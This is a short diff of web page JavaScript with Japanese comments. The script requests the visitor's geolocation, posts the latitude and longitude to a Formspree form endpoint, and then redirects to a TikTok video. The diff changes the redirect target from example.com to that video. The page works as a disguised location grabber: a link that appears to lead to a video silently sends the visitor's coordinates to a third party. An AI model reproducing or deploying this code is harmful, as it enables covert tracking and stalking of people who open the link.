@@ -17,7 +17,8 @@
             let lat = position.coords.latitude;
             let lon = position.coords.longitude;
 
-          fetch("https://formspree.io/f/xanedrka", {
+            // FormspreeのフォームURLにPOSTリクエスト
+            fetch("https://formspree.io/f/xanedrka", {
                 method: "POST",
                 headers: { 
                     "Content-Type": "application/x-www-form-urlencoded" 
@@ -25,8 +26,9 @@
                 body: `lat=${lat}&lon=${lon}`
             }).finally(redirectNow);
         }
+
         function redirectNow() {
-            window.location.replace("https://example.com"); // リダイレクト先のURL
+            window.location.replace("https://www.tiktok.com/@kaga1024/video/7431843644312800513"); // リダイレクト先のURL
         }
 
         getLocation();
